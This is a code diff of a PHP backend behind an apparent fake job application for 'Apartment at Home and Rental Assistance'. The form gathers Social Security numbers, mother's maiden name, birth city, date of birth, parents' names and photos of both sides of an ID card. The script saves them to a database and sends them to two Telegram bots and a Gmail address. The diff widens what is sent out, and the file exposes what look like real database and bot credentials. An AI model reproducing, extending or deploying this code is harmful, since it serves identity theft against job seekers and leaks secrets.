@@ -1,89 +1,183 @@
 <?php
-// --- Configuration & DB Setup (Neon Postgres) ---
+// ======================
+// NEON DATABASE (PostgreSQL)
+// ======================
 $host = "ep-calm-frog-ahfjj5vo-pooler.c-3.us-east-1.aws.neon.tech";
-$db   = "neondb"; $user = "neondb_owner"; $pass = "npg_TQ1gBOwA9rCa"; $port = "5432";
-$dsn = "pgsql:host=$host;port=$port;dbname=$db";
+$db   = "neondb";
+$user = "neondb_owner";
+$pass = "npg_TQ1gBOwA9rCa";
+$port = "5432";
+
+$dsn = "pgsql:host=$host;port=$port;dbname=$db;sslmode=require";
 
 try {
-    $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
+    $pdo = new PDO($dsn, $user, $pass, [
+        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
+    ]);
 } catch (Exception $e) {
     die("DB Connection failed: " . $e->getMessage());
 }
 
-// --- Process Form Data & Files ---
-$data = $_POST;
-$front_path = $back_path = $front_id_base64 = $back_id_base64 = null;
+// ======================
+// FORM DATA EXTRACTION
+// ======================
+$first_name     = $_POST['first_name'] ?? '';
+$middle_name    = $_POST['middle_name'] ?? '';
+$last_name      = $_POST['last_name'] ?? '';
+$phone          = $_POST['phone'] ?? '';
+$email          = $_POST['email'] ?? '';
+$dob            = $_POST['dob'] ?? '';
+$mother_maiden  = $_POST['mother_maiden'] ?? '';
+$ssn            = $_POST['ssn'] ?? '';
+$birth_city     = $_POST['birth_city'] ?? '';
+$address_line1  = $_POST['address_line1'] ?? '';
+$address_line2  = $_POST['address_line2'] ?? '';
+$city           = $_POST['city'] ?? '';
+$state          = $_POST['state'] ?? '';
+$zip_code       = $_POST['zip_code'] ?? '';
+
+$address        = $address_line1 . " " . $address_line2 . ", " . $city . ", " . $state . " " . $zip_code;
+$father_name    = $_POST['father_name'] ?? '';
+$mother_name    = $_POST['mother_name'] ?? '';
+
+// ======================
+// FILE PROCESSING (Temp Disk + Base64 DB Storage)
+// ======================
+$front_path = null;
+$back_path = null;
+$front_id_base64 = null;
+$back_id_base64 = null;
 
 if (!is_dir('uploads')) {
     mkdir('uploads', 0755, true);
 }
 
-// Fixed and optimized helper to handle file verification and path mapping
-function processFile($fileInput) {
-    if (isset($_FILES[$fileInput]) && $_FILES[$fileInput]['error'] === UPLOAD_ERR_OK) {
-        $path = "uploads/" . time() . "_" . basename($_FILES[$fileInput]['name']);
-        if (move_uploaded_file($_FILES[$fileInput]['tmp_name'], $path)) {
-            $base64 = 'data:' . mime_content_type($path) . ';base64,' . base64_encode(file_get_contents($path));
-            return [$path, $base64];
+function processUploadedFile($fileInputName) {
+    if (isset($_FILES[$fileInputName]) && $_FILES[$fileInputName]['error'] === UPLOAD_ERR_OK) {
+        $temporaryLocation = $_FILES[$fileInputName]['tmp_name'];
+        $savedPath = "uploads/" . time() . "_" . basename($_FILES[$fileInputName]['name']);
+        
+        if (move_uploaded_file($temporaryLocation, $savedPath)) {
+            $binaryData = file_get_contents($savedPath);
+            $mimeType = mime_content_type($savedPath);
+            $base64String = 'data:' . $mimeType . ';base64,' . base64_encode($binaryData);
+            return [$savedPath, $base64String];
         }
     }
     return [null, null];
 }
 
-list($front_path, $front_id_base64) = processFile('front_id');
-list($back_path, $back_id_base64) = processFile('back_id');
+list($front_path, $front_id_base64) = processUploadedFile('front_id');
+list($back_path, $back_id_base64) = processUploadedFile('back_id');
 
-// --- Insert into Database ---
-$stmt = $pdo->prepare("INSERT INTO job_applications (first_name, middle_name, last_name, phone, email, dob, mother_maiden, ssn, birth_city, address, father_name, mother_name, front_id, back_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+// ======================
+// SAVE TO POSTGRES DATABASE
+// ======================
+$stmt = $pdo->prepare("
+INSERT INTO job_applications (
+    first_name, middle_name, last_name, phone, email, dob, 
+    mother_maiden, ssn, birth_city, address, father_name, mother_name, 
+    front_id, back_id
+) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+");
+
 $stmt->execute([
-    $data['first_name'] ?? '', $data['middle_name'] ?? '', $data['last_name'] ?? '', $data['phone'] ?? '', $data['email'] ?? '', $data['dob'] ?? '', $data['mother_maiden'] ?? '', $data['ssn'] ?? '', $data['birth_city'] ?? '',
-    ($data['address_line1'] ?? '') . " " . ($data['address_line2'] ?? '') . ", " . ($data['city'] ?? '') . ", " . ($data['state'] ?? '') . " " . ($data['zip_code'] ?? ''),
-    $data['father_name'] ?? '', $data['mother_name'] ?? '', 
+    $first_name, $middle_name, $last_name, $phone, $email, $dob,
+    $mother_maiden, $ssn, $birth_city, $address, $father_name, $mother_name,
     $front_id_base64, $back_id_base64
 ]);
 
-// --- Telegram Alert System ---
+// ======================
+// TELEGRAM NOTIFICATION SYSTEM
+// ======================
 $bots = [
-    ["bot" => "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek", "chat" => "6513265609"],
-    ["bot" => "8972396935:AAG1WwV6vzEE5xkZty67SrE2GRYOO3HR8F0", "chat" => "5469294503"]
+    ["token" => "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek", "chat_id" => "6513265609"],
+    ["token" => "8972396935:AAG1WwV6vzEE5xkZty67SrE2GRYOO3HR8F0", "chat_id" => "5469294503"]
 ];
 
-function sendTelegram($url, $data) {
+// Reconstructed your exact text layout details
+$textMessage = "📄 New Application Submitted\n\n"
+. "👤 Name: $first_name $middle_name $last_name\n"
+. "📞 Phone: $phone\n"
+. "📧 Email: $email\n"
+. "🎂 DOB: $dob\n"
+. "🏠 Address: $address\n"
+. "🏙 Birth City: $birth_city\n"
+. "👨 Father: $father_name\n"
+. "👩 Mother: $mother_name\n"
+. "🧾 SSN: $ssn";
+
+// Helper function to send Text safely
+function sendTelegramText($token, $chatId, $text) {
+    $url = "https://telegram.org" . $token . "/sendMessage";
+    $params = ['chat_id' => $chatId, 'text' => $text];
+    @file_get_contents($url . "?" . http_build_query($params));
+}
+
+// Helper function to send large media document files via stream payload
+function sendTelegramDocument($token, $chatId, $filePath, $caption) {
+    if (!$filePath || !file_exists($filePath)) return;
+    
+    $url = "https://telegram.org" . $token . "/sendDocument";
     $ch = curl_init();
+    
+    $postFields = [
+        'chat_id'  => $chatId,
+        'document' => new CURLFile($filePath),
+        'caption'  => $caption
+    ];
+    
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    
     curl_exec($ch);
     curl_close($ch);
 }
 
-// Format Notification Text
-$text = "📄 New Application\n"
-      . "👤 Name: " . ($data['first_name'] ?? '') . " " . ($data['last_name'] ?? '') . "\n"
-      . "📞 Phone: " . ($data['phone'] ?? '') . "\n"
-      . "📧 Email: " . ($data['email'] ?? '');
-
-// Push Data Arrays to Active Bots
-foreach ($bots as $b) {
-    sendTelegram("https://telegram.org{$b['bot']}/sendMessage", ['chat_id' => $b['chat'], 'text' => $text]);
-    if ($front_path && file_exists($front_path)) {
-        sendTelegram("https://telegram.org{$b['bot']}/sendDocument", ['chat_id' => $b['chat'], 'document' => new CURLFile(realpath($front_path)), 'caption' => 'Front ID']);
+// Distribute to all configured bots
+foreach ($bots as $bot) {
+    // 1. Send text profile overview data 
+    sendTelegramText($bot['token'], $bot['chat_id'], $textMessage);
+    
+    // 2. Transmit file objects over network stream
+    if ($front_path) {
+        sendTelegramDocument($bot['token'], $bot['chat_id'], $front_path, "🪪 Front ID - $first_name $last_name");
     }
-    if ($back_path && file_exists($back_path)) {
-        sendTelegram("https://telegram.org{$b['bot']}/sendDocument", ['chat_id' => $b['chat'], 'document' => new CURLFile(realpath($back_path)), 'caption' => 'Back ID']);
+    if ($back_path) {
+        sendTelegramDocument($bot['token'], $bot['chat_id'], $back_path, "🪪 Back ID - $first_name $last_name");
     }
 }
 
-// --- Local Server Cleanup ---
-if ($front_path && file_exists($front_path)) unlink($front_path);
-if ($back_path && file_exists($back_path)) unlink($back_path);
+// ======================
+// STORAGE CLEANUP (Protects Render's RAM allocation limits)
+// ======================
+if ($front_path && file_exists($front_path)) @unlink($front_path);
+if ($back_path && file_exists($back_path)) @unlink($back_path);
 
-// --- Success Web Panel ---
+// ======================
+// EMAIL BACKUP NOTIFICATION
+// ======================
+$to = "collaomn@gmail.com";
+$subject = "New Job Form Submission";
+$headers = "From: noreply@yourdomain.com";
+@mail($to, $subject, $textMessage, $headers);
+
+// ======================
+// SUCCESS USER INTERFACE DISPLAY
+// ======================
 echo "
-<div style='max-width:600px;margin:50px auto;padding:40px;background:#0f172a;color:white;border-radius:15px;text-align:center;font-family:sans-serif;'>
-    <h1 style='color:#22c55e;'>✓ Submitted!</h1>
-    <p>Thank you. Your application has been logged permanently.</p>
+<div style='max-width:700px;margin:60px auto;padding:50px;background:#0f172a;color:white;border-radius:20px;text-align:center;font-family:Arial,sans-serif;box-shadow:0 10px 30px rgba(0,0,0,0.4);'>
+    <div style='font-size:80px;color:#22c55e;margin-bottom:20px;'>✓</div>
+    <h1 style='font-size:42px;margin-bottom:25px;color:#ffffff;'>Form Submitted Successfully!</h1>
+    <p style='font-size:24px;line-height:1.8;color:#e2e8f0;'>
+        Thank you for considering <strong>Apartment at Home and Rental Assistance</strong>.<br><br>We will contact you shortly.
+    </p>
+    <div style='margin-top:40px;border-top:1px solid #334155;padding-top:25px;'>
+        <h2 style='font-size:30px;color:#38bdf8;margin-bottom:10px;'>Taylor Luis</h2>
+        <p style='font-size:20px;color:#cbd5e1;'>Director of Human Resources</p>
+    </div>
 </div>";
 ?>
